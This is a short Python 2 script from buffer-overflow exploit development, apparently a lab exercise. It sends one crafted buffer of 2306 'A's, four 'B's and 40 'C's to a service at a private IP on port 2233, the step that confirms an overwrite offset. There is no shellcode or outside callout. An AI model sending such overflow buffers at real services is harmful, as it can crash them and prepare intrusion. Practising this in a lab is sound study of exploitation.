import socket
import time
print "\nFuzz buffer..."


buffer = "A" * 2306 + "B" * 4 + "C" * 40

while len(buffer) < 10000: 
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.155.10", 2233))
	s.send(buffer)
	s.close()
	print "Sent length -> %s" % len(buffer)
	time.sleep(3)
	exit()
#	raw_input()
#	buffer = buffer + "A" * 1000

print "\nDone!"
